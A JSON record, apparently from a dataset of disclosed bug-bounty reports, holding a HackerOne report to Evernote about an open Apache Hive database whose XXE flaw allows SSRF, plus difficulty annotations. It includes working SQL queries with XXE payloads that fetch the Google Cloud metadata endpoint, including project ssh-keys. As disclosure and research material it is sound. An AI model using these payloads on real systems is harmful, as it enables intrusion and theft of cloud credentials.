@@ -1,0 +1,42 @@
+{
+  "reported_to": "Evernote",
+  "reported_by": "kaulse ",
+  "title": "Non-production Open Database In Combination With XXE Leads To SSRF",
+  "content": "\nSummary:\nThe Apache Hive database hosted on the IP \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 and open on port 10000 is open and vulnerable to XXE.\nBy \"open\", I mean that the database can be accessed by anyone.\nSteps To Reproduce:\nChose any database client that supports Apache Hive and also uses a specific client version. \"Specific client version\" because you will otherwise get an error which looks like this:\nCode 336 Bytes\n113:22:26.077 [main] ERROR org.apache.hive.jdbc.HiveConnection - Error opening session\n2org.apache.hive.org.apache.thrift.TApplicationException: Required field 'client_protocol' is unset! Struct:TOpenSessionReq(client_protocol:null, configuration:{set:hiveconf:hive.server2.thrift.resultset.default.fetch.size=1000, use:database=default})\nChose a database client and connect to mentioned IP and port\nExecute the following SQL payload:\nCode 231 Bytes\n1select xpath_string('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"http://metadata.google.internal/computeMetadata/v1beta1/project/project-id\"> ]><stockCheck>&xxe;</stockCheck>', '*') FROM test LIMIT 5;\nThe query above will return the associated project id which is \"en-development\".\nSupporting Material/References:\nI will list some interesting information that I queried below.\nQuery\nCode 240 Bytes\n1select xpath_string('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys\"> ]><stockCheck>&xxe;</stockCheck>', '*') FROM test LIMIT 5;\nResponse\nCode 328 Bytes\n1\u2588\u2588\u2588\u2588\n2\u2588\u2588\u2588\u2588\u2588\n3\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n4\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n5\u2588\u2588\u2588\u2588\u2588\u2588\n6\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n7\u2588\u2588\u2588\u2588\u2588\u2588\n8\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n9\u2588\u2588\u2588\u2588\n10\u2588\u2588\u2588\u2588\n11\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n12\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n13\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n14\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n15\u2588\u2588\u2588\u2588\u2588\u2588\n16\u2588\u2588\u2588\u2588\u2588\n17\u2588\u2588\u2588\n18\u2588\u2588\u2588\n19\u2588\u2588\u2588\u2588\n20\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n21\u2588\u2588\u2588\u2588\u2588\u2588\n22\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n23\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n24\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n25\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n26\u2588\u2588\u2588\u2588\n27\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n28\u2588\u2588\u2588\u2588\n29\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n30\u2588\u2588\u2588\u2588\u2588\n31\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n32\u2588\u2588\u2588\u2588\u2588\n33\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n34\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n35\u2588\u2588\u2588\u2588\u2588\u2588\n36\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n37\u2588\u2588\u2588\u2588\u2588\n38\u2588\u2588\u2588\u2588\u2588\n39\u2588\u2588\u2588\u2588\u2588\u2588\n40\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n41\u2588\u2588\u2588\u2588\u2588\n42\u2588\u2588\u2588\n43\u2588\u2588\u2588\u2588\nImpact\nAccess to the GCP project via the Google Cloud metadata endpoint which leads to access to at least the Google Cloud storage buckets and Google Cloud BigTable/BigQuery.\n\n",
+  "severity": [
+    9.0,
+    10.0
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "XML External Entities (XXE)"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1603826400,
+  "report_url": "https://hackerone.com/reports/742808",
+  "is_multi_component": true,
+  "complexity": "HIGH",
+  "novelty": "MEDIUM",
+  "vuln_category": "API",
+  "steps": [
+    [
+      1,
+      "Connect to the Apache Hive database on the specified IP and port using a compatible database client."
+    ],
+    [
+      2,
+      "Execute the SQL payload containing an XXE injection to retrieve sensitive information from the metadata endpoint."
+    ]
+  ],
+  "vuln_description": "The vulnerability involves an open Apache Hive database that is susceptible to XXE injection, leading to SSRF. This allows an attacker to access sensitive metadata from the Google Cloud metadata endpoint, potentially compromising the GCP project.",
+  "reason": "The attack requires knowledge of specific client versions for Apache Hive and the construction of a precise XXE payload. However, once the correct client is identified, the attack is straightforward to execute.",
+  "new_complexity": "MEDIUM",
+  "requires_code": false,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "authnz_metadata": {
+    "reason": "The vulnerability involves an XXE attack leading to SSRF, which is not directly related to authentication or authorization bypass within the same application. The methodology described focuses on testing authorization boundaries by swapping user sessions and resource IDs within the same application context, not exploiting XML parsing vulnerabilities to access external systems.",
+    "is_detectable": false
+  }
+}
